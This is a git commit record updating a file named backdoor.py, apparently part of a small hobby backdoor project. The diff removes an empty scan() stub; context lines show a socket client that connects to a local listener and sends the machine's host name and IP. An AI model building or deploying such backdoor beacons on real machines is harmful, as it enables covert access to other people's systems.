4ea9e87cf78185bca1f817f9bd58e6335cc832a7
Robert <44000916+robertpaschoal@users.noreply.github.com>
2020-08-27 11:48:06 -0300

    Update backdoor.py

--- src/backdoor.py
+++ src/backdoor.py
@@ -17,9 +17,6 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 1234))
 s.send("Conexao Feita com:{} IP:{}".format(hostname, ip))
 
-#Fucoes 
-def scan():
-	
 
 #Main
 def main():
